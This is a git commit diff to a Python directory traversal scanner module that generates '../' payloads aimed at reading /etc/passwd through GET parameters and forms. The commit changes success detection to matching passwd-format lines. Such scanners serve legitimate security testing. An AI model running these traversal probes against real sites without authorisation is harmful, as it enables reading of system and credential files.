1aaf1d54488f56a6f929ecc377010d48bf5fcec9
joshuaaung <mj_kyawswa@yahoo.com>
2018-04-23 18:27:30 +0800

    validation check on GET request part of the DT updated to passwd-content-pattern counting instead of checking the content length of the status

--- tools/directory_traversal.py
+++ tools/directory_traversal.py
@@ -1,7 +1,7 @@
 from crawler import Crawler
 from generator import ExploitGenerator
 
-import httplib2, urllib, urllib2
+import httplib2, urllib, urllib2, requests
 from BeautifulSoup import BeautifulSoup, SoupStrainer
 from urlparse import urljoin, urlparse
 from helper import has_form, parse_form, get_form_action, post_request, create_get_params, create_post_params
@@ -22,7 +22,7 @@ class DTModule:
         self.url = url
         self.pages = pages
         self.logs = {}
-        
+
     def log_results(self, results, category):
         log = {}
         log["class"] = category
@@ -37,6 +37,7 @@ class DTModule:
         log["results"][self.url] = processed_results
         return log
 
+    #extract the param names from the query string 'param1=val1&param2=val2&...'
     def retrieve_params(self, params):
         result = []
         split = params.split("&")
@@ -55,17 +56,17 @@ class DTModule:
         for path in paths:
             for y in params:
                 combined = y + "=" + path + "&"
-            results.append(combined.rstrip("&"))
+            results.append(combined.rstrip("&")) #remove the last '&'
         return results
 
     def prepare_paths(self, depth, file):
         path = "./"
         paths = []
         for x in range(1, depth):
-            path += "../" 
+            path += "../"
             test = path + file
             paths.append(test)
-        return paths
+        return paths #[./../etc/passwd , ./../../etc/passwd, ./../../../etc/passwd, ....]
 
 
     def in_cache(self, cache, string):
@@ -74,9 +75,31 @@ class DTModule:
             if str(x) == str(string):
                 result = True
         return result
-        
+
+    def has_passwd_content(self, parsed_response):
+        toReturn = False
+
+        for data_line in parsed_response:
+            if self.check_passwd_content_pattern(data_line):
+                toReturn = True
+                break
+
+        return toReturn
+
+    # Fed data string is checked if it consists /etc/passwd file pattern
+    # Followed: https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/
+    def check_passwd_content_pattern(self, data_line):
+        toReturn = False
+
+        data_line_content = data_line.split(":")
+
+        if len(data_line_content) == 7: # '7' because the number of fields(separated by ':') in each line of content in the passwd is 7
+            toReturn = True
+
+        return toReturn
+
     def scan(self):
-    
+
         results = []
         cache = []
 
@@ -89,18 +112,21 @@ class DTModule:
             if parsed.query:
                 # print("testing page: " + web_page)
                 payloads = self.prepare_params(parsed.query, 30, "etc/passwd")
-                
+
                 for payload in payloads:
                     url = parsed.scheme + "://" + parsed.hostname + parsed.path + "?" + payload
                     new_status, new_response = http.request(url)
 
-                    if new_status.status == 200:
-                        if int(new_status['content-length']) > int(status['content-length']):
+                    parsed_response = new_response.splitlines()
+
+                    if new_status.status == requests.codes.ok:
+                        # if int(new_status['content-length']) > int(status['content-length']):
+                        if self.has_passwd_content(parsed_response):
                             # print("vulnerable url: " + url + "\n")
                             if not self.in_cache(cache, url):
                                 results.append((urlparse(url).path, create_get_params(url), "GET"))
                                 cache.append(url)
-                                break  
+                                break
                             break
 
             # handle scan for post php forms
@@ -123,5 +149,5 @@ class DTModule:
                     if len(new_response) > len(original_response): # That means that the webpage is different, possibly a successful case
                         results.append((urlparse(web_page).path, create_post_params(injection_forms), "POST"))
                         break
-          
+
         self.logs = self.log_results(results, EXPLOIT_CLASS)
